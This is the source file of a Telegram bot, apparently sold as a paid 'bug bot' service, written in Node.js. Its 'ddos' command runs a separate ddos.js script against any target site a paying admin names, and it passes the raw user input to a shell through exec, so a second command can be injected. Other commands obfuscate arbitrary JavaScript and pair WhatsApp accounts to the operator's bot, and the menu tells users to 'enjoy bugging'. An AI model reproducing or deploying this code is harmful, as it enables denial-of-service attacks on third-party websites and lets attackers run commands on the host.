/**
   * Create By king Badboi .
   * Contact Me on wa.me/2348140825959
*/

require('./settings');
const {
    Telegraf,
    Context,
    Markup
} = require('telegraf')
const {
    message,
    editedMessage,
    channelPost,
    editedChannelPost,
    callbackQuery
} = require("telegraf/filters");
const {toFirstCase,
        isNumber,
        formatp,
        parseMention, 
        resize, 
        getRandom,
        generateProfilePicture, 
        getCase,  
        FileSize, 
        h2k, 
        makeid, 
        kyun, 
        randomNomor, 
        jsonformat, 
        isUrl,
        fetchJson, 
        sleep,
        getBuffer
        } = require("./lib/myfunc2");
        const { formatSize } = require("./lib/myfunc3");
const chalk = require('chalk')
const fs = require('fs')
const fetch = require('node-fetch')
const os = require('os')
const speed = require('performance-now')
const ms = toMs = require('ms')
const util = require('util')
const { exec, spawn, execSync } = require("child_process")
const MAX_PAIR_LIMIT = 80;
const TIME_LIMIT_MS = 180000; // 3 minutes 
// Store last execution time and pair count for each user

const userStatus = {};
const yts = require('yt-search')
const axios = require('axios');
const {
    simple
} = require('./lib/myfunc')
const {
    runtime
} = require('./lib/myfunc1')
const adminfile = 'database/admintele.json';
// Read the adminfile and parse it as JSON
    const adminIDs = JSON.parse(fs.readFileSync(adminfile, 'utf8'));

module.exports = bad = async (bad, bot) => {
    //console.log(bad)
    try {
        const body = bad.message.text || bad.message.caption || ''
        const budy = (typeof bad.message.text == 'string' ? bad.message.text : '')
        const {
            isUrl
        } = simple
        const isCmd = /^[°•π÷×¶∆£¢€¥®™�✓_=|~!?#/$%^&.+-,\\\©^]/.test(body)        
        const args = body.trim().split(/ +/).slice(1)
        const text = q = args.join(" ")
        const user = simple.getUserName(bad.message.from)
        const pushname = user.full_name;
        const user_id = bad.message.from.id + " "
        const username = bad.message.from.username ? bad.message.from.username : " 🦄 @Senzo268 🇦🇱 V18ᯭ";
        const isCreator = OWNER[0].replace("https://t.me/", '') == bad.update.message.from.username
        const from = bad.message.chat.id
const prefix = isCmd ? body[0] : ''
        const command = isCreator ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
        const isGroup = bad.chat.type.includes('group')
        const groupName = isGroup ? bad.chat.title : ''

        const isImage = bad.message.hasOwnProperty('photo')
        const isVideo = bad.message.hasOwnProperty('video')
        const isAudio = bad.message.hasOwnProperty('audio')
        const isSticker = bad.message.hasOwnProperty('sticker')
        const isContact = bad.message.hasOwnProperty('contact')
        const isLocation = bad.message.hasOwnProperty('location')
        const isDocument = bad.message.hasOwnProperty('document')
        const isAnimation = bad.message.hasOwnProperty('animation')
        const isMedia = isImage || isVideo || isAudio || isSticker || isContact || isLocation || isDocument || isAnimation
        const quotedMessage = bad.message.reply_to_message || {}
        const isQuotedImage = quotedMessage.hasOwnProperty('photo')
        const isQuotedVideo = quotedMessage.hasOwnProperty('video')
        const isQuotedAudio = quotedMessage.hasOwnProperty('audio')
        const isQuotedSticker = quotedMessage.hasOwnProperty('sticker')
        const isQuotedContact = quotedMessage.hasOwnProperty('contact')
        const isQuotedLocation = quotedMessage.hasOwnProperty('location')
        const isQuotedDocument = quotedMessage.hasOwnProperty('document')
        const isQuotedAnimation = quotedMessage.hasOwnProperty('animation')
        const isQuoted = bad.message.hasOwnProperty('reply_to_message')
        const timestampi = speed();
        const latensii = speed() - timestampi

        const reply = async (text) => {
            for (var x of simple.range(0, text.length, 4096)) { //maks 4096 character, jika lebih akan eror
                return await bad.replyWithMarkdown(text.substr(x, 4096), {
                    disable_web_page_preview: true
                })
            }
        }
        const expirationDateString = '2026-12-24T18:00:00+05:30'; // Specify your desired expiration date here
const expirationTime = new Date(expirationDateString);
const currentTime1 = new Date();
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const expirationTime1 = new Date(expirationDateString);
async function xeonydatabase1(){
await bad.reply(`⚠️Trial Expired!! Contact developer for buy.\nTelegram: t.me/Senzo268\nWhatsApp: wa.me/923021142153\n`)
            	await delay(5000);
            console.error('⚠️Trial Expired!! Contact developer for buy.\nTelegram: @Senzo268\nWhatsApp: +923021142153\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
        const getStyle = (style_, style, style2) => {
            listt = `${lang.getStyle(style, style2)}`
            for (var i = 0; i < 300; i++) {
                listt += '» `' + style_[i] + '`\n'
            }
            reply(listt)
        }

        //get type message 
        var typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = 'Image'
        else if (isVideo) typeMessage = 'Video'
        else if (isAudio) typeMessage = 'Audio'
        else if (isSticker) typeMessage = 'Sticker'
        else if (isContact) typeMessage = 'Contact'
        else if (isLocation) typeMessage = 'Location'
        else if (isDocument) typeMessage = 'Document'
        else if (isAnimation) typeMessage = 'Animation'

        //push message to console
        if (bad.message) {
            console.log(chalk.black(chalk.bgWhite('[ CMD ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(body || typeMessage)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname) + '\n' + chalk.blueBright('=> In'), chalk.green(isGroup ? groupName : 'Private Chat', bad.message.chat.id))
        }
        
 const sendMessage = (chatId, text) => bot.sendMessage(chatId, text);
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}       


switch (command) {
	case 'enc': case 'encrypt': {
		
        	// Read the adminfile and parse it as JSON
    let adminIDs;
    try {
        adminIDs = JSON.parse(fs.readFileSync(adminfile, 'utf8'));
    } catch (err) {
        console.error('Error reading adminID.json:', err);
        return bad.reply('Failed to load admin data.');
    }
    // Convert user ID to a string and check if it exists in the admin file
    const userID = bad.message.from.id.toString();
    if (!Array.isArray(adminIDs) || !adminIDs.includes(userID)) {
        return bad.reply(`You are not authorized to use this command.\nPlease dm ${OWNER_NAME} for buy.`);
    }
                	
    const JSConfuser = require("js-confuser");

    const usage = `Usage Example:
${prefix + command} (Input text or reply text to obfuscate code)
${prefix + command} doc (Reply to a document)`;

    let text;
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (bad.message.reply_to_message && bad.message.reply_to_message.text) {
        text = bad.message.reply_to_message.text;
    } else {
        return reply(usage);
    }
    
    try {
        let code;
        if (text === 'doc' && bad.message.reply_to_message && bad.message.reply_to_message.document) {
            const fileLink = await bot.telegram.getFileLink(bad.message.reply_to_message.document.file_id);
            const response = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
            code = Buffer.from(response.data).toString('utf-8');
        } else {
            code = text;
        }

        const optionsObf6 = {
          target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "素晴座素晴難BADBOI素晴座素晴難" + 
            "素晴座素晴難BADBOI素晴座素晴難";
        
        // Fungsi untuk menghapus karakter yang tidak diinginkan
        function removeUnwantedChars(input) {
            return input.replace(
                /[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, ''
            );
        }

        // Fungsi untuk menghasilkan string acak
        function randomString(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; // Hanya simbol
            const charactersLength = characters.length;

            for (let i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }

        return removeUnwantedChars(originalString) + randomString(2);
    },

    renameVariables: true,
    renameGlobals: true,

    stringEncoding: true,
    stringSplitting: 0.0,
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: 1.0,

    shuffle: {
        hash: 0.0,
        true: 0.0
    },

    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 0.9,
    deadCode: 0.0,
    dispatcher: true,
    rgf: false,
    calculator: true,
    hexadecimalNumbers: true,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};

        const obfuscatedCode = await JSConfuser.obfuscate(code, optionsObf6);

        const filePath = './enc_by_@badboi.js';
        fs.writeFileSync(filePath, obfuscatedCode);

        await bot.telegram.sendDocument(bad.message.chat.id, {
            source: filePath,
            filename: 'Encrypted By @scarlet-v6.js'
        });

        // Clean up the temporary file
        

    } catch (error) {
        console.error('Error during encryption:', error);
        return reply(`Error: ${error.message}`);
    }
}
break;


case 'dec': case 'decrypt': {

        	// Read the adminfile and parse it as JSON
    let adminIDs;
    try {
        adminIDs = JSON.parse(fs.readFileSync(adminfile, 'utf8'));
    } catch (err) {
        console.error('Error reading adminID.json:', err);
        return bad.reply('Failed to load admin data.');
    }
    // Convert user ID to a string and check if it exists in the admin file
    const userID = bad.message.from.id.toString();
    if (!Array.isArray(adminIDs) || !adminIDs.includes(userID)) {
        return bad.reply(`You are not authorized to use this command.\nPlease dm ${OWNER_NAME} for buy.`);
    }
                	
    const { webcrack } = await import('webcrack');
    const usage = `Usage Example:
${prefix + command} (Input text or reply text to decrypt code)
${prefix + command} doc (Reply to a document)`;

    let text;
    if (args.length >= 1) {
        text = args.join(" ");
    } else if (quotedMessage?.text) {
        text = quotedMessage.text;
    } else if (isQuotedDocument) {
        const fileId = quotedMessage.document.file_id;
        const fileLink = await bot.telegram.getFileLink(fileId);
        const fileBuffer = await axios.get(fileLink.href, { responseType: 'arraybuffer' });
        text = fileBuffer.data.toString('utf-8');
    } else {
        return reply(usage);
    }

    try {
        const decryptedCode = await webcrack(text);

        const filePath = './dec_by_bot.js';
        fs.writeFileSync(filePath, decryptedCode.code);

        await bot.telegram.sendDocument(from, { source: filePath, filename: 'Decrypted_By_scarlet-v6.js' });
        fs.unlinkSync(filePath); // Clean up
    } catch (error) {
        return reply(`There was an error: ${error.message}`);
    }
}

break;
case 'reqpair': {
let adminIDs;
    try {
        adminIDs = JSON.parse(fs.readFileSync(adminfile, 'utf8'));
    } catch (err) {
        console.error('Error reading adminID.json:', err);
        return bad.reply('Failed to load admin data.');
    }
    // Convert user ID to a string and check if it exists in the admin file
    const userID = bad.message.from.id.toString();
    
    // Check system storage and RAM
    const freeStorage = os.freemem() / (1024 * 1024); // Free memory in MB
    const totalStorage = os.totalmem() / (1024 * 1024); // Total memory in MB
    const freeDiskSpace = fs.statSync('/').available / (1024 * 1024); // Free disk space in MB

    if (freeStorage < 300 || freeDiskSpace < 300) { // Set a threshold of 100 MB for storage and RAM
        return bad.reply('Slot is full, please try again later.');
    }
    
  
    // Read the adminfile and parse it as JSON
    if (!text) {
        return bad.reply('Please provide a number for requesting the pair code. Usage: /connect 234###');
    }
    
 target = text.split("|")[0]
const Xreturn = bad.message.reply_to_message ? bad.message.reply_to_message.from.id 
        : target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
var contactInfo =  Xreturn;
  if (contactInfo.length == 0) {
    return bad.reply("The number is not registered on WhatsApp");
  }

    // Extract and validate the country code or prefix
    const countryCode = text.slice(0, 3); // Extract the first 3 digits for country code
    const prefixxx = text.slice(0, 1); // Extract the first digit for prefix
    if (countryCode === "252" || countryCode === "201" || countryCode === "66" || countryCode === "0") {
        return bad.reply("Sorry, numbers with country code 252 or prefix 0 are not supported for using the bot.");
    }

    // Proceed with pairing
    const startpairing = require('./rentbot.js');
    await startpairing(Xreturn);
    await sleep(4000);
    
    const cu = fs.readFileSync('./lib2/pairing/pairing.json', 'utf-8');
    const cuObj = JSON.parse(cu);
    
    bad.reply(`[CLICK HERE TO COPY YOUR REQUEST OTP CODE FOR ${target}](https://www.whatsapp.com/otp/code/?otp_type=COPY_CODE&code=otp${cuObj.code})

To pair your WhatsApp account, follow these steps:


1. On your WhatsApp home page, click on the three dots in the top right corner.
2. Tap *Link Device*
3. Tap *Link a device*
4. Just below there will be a *Link with phone number instead*, tap on it
5. Paste your 6 character code`, { 
  parse_mode: 'Markdown', 
  disable_web_page_preview: true 
});
    // Set cooldown for non-developer users
                
}
break


                
                case 'ddos':{
                	if (currentTime1 > expirationTime1) {
	await xeonydatabase1();
        } else {
        	// Read the adminfile and parse it as JSON
    let adminIDs;
    try {
        adminIDs = JSON.parse(fs.readFileSync(adminfile, 'utf8'));
    } catch (err) {
        console.error('Error reading adminID.json:', err);
        return bad.reply('Failed to load admin data.');
    }
    // Convert user ID to a string and check if it exists in the admin file
    const userID = bad.message.from.id.toString();
    if (!Array.isArray(adminIDs) || !adminIDs.includes(userID)) {
        return bad.reply(`You are not authorized to use this command.\nPlease dm ${OWNER_NAME} for buy.`);
    }
                	
if (!text.includes(' ')) return bad.reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.xyz 60`)
if (text.includes('dgxeon.shop')){
	return bad.reply(`Cannot attack developer's site`);
	}
                     const targetweb = text.substring(0, text.indexOf(' ') - 0)
                const timeweb = text.substring(text.lastIndexOf(' ') + 1) 
bad.reply(`Bot is attacking ${targetweb} with time ${timeweb}`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          bad.reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bad.reply(`Error: ${stderr}`);
          return;
        }
        bad.reply(`Success\n\n🤙 target: ${targetweb},\n🤙 Time: ${timeweb}`);
      });  
      }                 
      }
break
case "checkhost": {
	if (currentTime1 > expirationTime1) {
	await xeonydatabase1();
        } else {
        	// Read the adminfile and parse it as JSON
    let adminIDs;
    try {
        adminIDs = JSON.parse(fs.readFileSync(adminfile, 'utf8'));
    } catch (err) {
        console.error('Error reading adminID.json:', err);
        return bad.reply('Failed to load admin data.');
    }
    // Convert user ID to a string and check if it exists in the admin file
    const userID = bad.message.from.id.toString();
    if (!Array.isArray(adminIDs) || !adminIDs.includes(userID)) {
        return bad.reply(`You are not authorized to use this command.\nPlease dm ${OWNER_NAME} for buy.`);
    }
                	
if (!text) return bad.reply(`Example : ${prefix + command} https://nxnn.com`)
bad.reply(`Click on the link below\n\n👉https://check-host.net/check-http?host=${text}`)
}
}
break
case 'listpair': {
    if (currentTime1 > expirationTime1) {
        await xeonydatabase1();
    } else {
        // Read the adminfile and parse it as JSON
        let adminIDs;
        try {
            adminIDs = JSON.parse(fs.readFileSync(adminfile, 'utf8'));
        } catch (err) {
            console.error('Error reading adminID.json:', err);
            return bad.reply('Failed to load admin data.');
        }

        // Check if the user is an admin
        const userID = bad.message.from.id.toString();
        if (!Array.isArray(adminIDs) || !adminIDs.includes(userID)) {
            return bad.reply(`You are not authorized to use this command.\nPlease DM ${OWNER_NAME} to buy access.`);
        }

        const pairingPath = './lib2/pairing';

        try {
            // Check if the directory exists
            if (!fs.existsSync(pairingPath)) {
                return bad.reply('No paired devices found.');
            }

            // Read all directories (and files) inside ./lib2/pairing
            const entries = fs.readdirSync(pairingPath, { withFileTypes: true });

            // Filter for directories (paired device IDs)
            const pairedDevices = entries
                .filter(entry => entry.isDirectory())
                .map(entry => entry.name); // Get directory names as IDs

            // Handle if no paired devices are found
            if (pairedDevices.length === 0) {
                return bad.reply('No paired devices found.');
            }

            // Format the list of paired devices for the response
            const deviceList = pairedDevices
                .map((device, index) => `${index + 1}. ID: ${device}`)
                .join('\n');

            bad.reply(`Paired Devices:\n${deviceList}`);
        } catch (err) {
            console.error('Error reading paired devices directory:', err);
            return bad.reply('Failed to load paired devices data.');
        }
    }
}
break;
case 'delpair': {
    if (currentTime1 > expirationTime1) {
        await xeonydatabase1();
    } else {
        // Read the adminfile and parse it as JSON
        let adminIDs;
        try {
            adminIDs = JSON.parse(fs.readFileSync(adminfile, 'utf8'));
        } catch (err) {
            console.error('Error reading adminID.json:', err);
            return bad.reply('Failed to load admin data.');
        }

        // Check if the user is an admin
        const userID = bad.message.from.id.toString();
        if (!Array.isArray(adminIDs) || !adminIDs.includes(userID)) {
            return bad.reply(`You are not authorized to use this command.\nPlease DM ${OWNER_NAME} to buy access.`);
        }

        // Validate input text (ID to delete)
        if (!text) {
            return bad.reply('Please provide the ID of the paired device to delete. Usage: /deletepaired <id>');
        }

        const targetID = text.trim();
        const pairingPath = './lib2/pairing';
        const targetPath = `${pairingPath}/${targetID}`;

        try {
            // Check if the target directory exists
            if (!fs.existsSync(targetPath)) {
                return bad.reply(`Paired device with ID "${targetID}" does not exist.`);
            }

            // Delete the target directory and its contents
            fs.rmSync(targetPath, { recursive: true, force: true });

            bad.reply(`Paired device with ID "${targetID}" has been successfully deleted.`);
        } catch (err) {
            console.error('Error deleting paired device:', err);
            return bad.reply('An error occurred while attempting to delete the paired device.');
        }
    }
}
break;
case 'runtime':{
    bad.deleteMessage().catch(() => {});
      reply(`━━━━━━━━━━━━━━━━━\n◉ 𝙷𝙴𝙻𝙻𝙾 ${pushname}\n━━━━━━━━━━━━━━━━━\n   🦄 @Senzo268 🇦🇱 V18 𝚁𝚄𝙽𝚃𝙸𝙼𝙴   : ${runtime(process.uptime())}`)
    }
break;
case 'ping':{
let timestamp = speed()
let latensi = speed() - timestamp
    bad.deleteMessage().catch(() => {});
      reply(`━━━━━━━━━━━━━━━━━\n\◉ 𝙷𝙴𝙻𝙻𝙾 ${pushname}\n\━━━━━━━━━━━━━━━━━\n\◈ 🦄 @Senzo268 🇦🇱 V18 𝚂𝙿𝙴𝙴𝙳   : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`)
    }
break;   
case 'owner': 
  let ownerText = 
  `𝙊𝙒𝙉𝙀𝙍 𝙄𝙉𝙵𝙊
┏━━━━━━━━━━━━━━
┃ ⎚ 𝙾𝚆𝙽𝙴𝚁 𝙽𝚄𝙼 : ${global.ownernumber}
┃ ⎚ 𝙾𝚆𝙽𝙴𝚁 𝙽𝙰𝙼𝙴 :  ${global.OWNER_NAME}
┃ ⎚ 𝙾𝚆𝙽𝙴𝚁 𝙸𝙳 : ${global.DEVELOPER}
┗━━━━━━━━━━━━━━`
  bad.replyWithPhoto(
    global.pp2, {
      caption: ownerText
    }
  );
break
case 'menu': 
case 'start':
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const formattedUsedMem = formatSize(usedMem);
  const more = String.fromCharCode(8206)
  const readmore = more.repeat(4001)
  const formattedTotalMem = formatSize(totalMem);
  let xeontext = 
  `Hi 👋 ${pushname}
𝘩𝘰𝘱𝘦 𝘺𝘰𝘶 𝘦𝘯𝘫𝘰𝘺 𝘣𝘶𝘨𝘨𝘪𝘯𝘨

┏━━「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧 」━━╼
┃ Bot Name: 🦄 Senzo Bug Bot 🇦🇱 V18
┃ Owner Name: @Senzo268
𝙊𝙒𝙉𝙀𝙍 𝙄𝙉𝙵𝙊
┏━━━━━━━━━━━━━━
┃ ⎚ 𝙾𝚆𝙽𝙴𝚁 𝙽𝚄𝙼 : ${global.ownernumber}
┃ ⎚ 𝙾𝚆𝙽𝙴𝚁 𝙽𝙰𝙼𝙴 :  ${global.OWNER_NAME}
┃ ⎚ 𝙾𝚆𝙽𝙴𝚁 𝙸𝙳 : ${global.DEVELOPER}
┗━━━━━━━━━━━━━━

╔══「 CONNECT WA 」══▢
║ /reqpair 
║ /delpair 
╚══════▢`
  bad.replyWithPhoto(
    global.pp, 
    {
      caption: xeontext,
      reply_markup: {
        inline_keyboard: [
          [
            { text: '📲 CONTACT OWNER', url: 'https://t.me/Senzo268' },

            { text: '📱 WhatsApp Channel', url: 'https://whatsapp.com/channel/0029VbBdHQnKWEKtmxS7XZ09' }
          ],
        ]
      }
    }
  );
break

            default:
        }
    } catch (e) {
        bad.reply(util.format(e))
        console.log('[ ERROR ] ' + e)
    }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})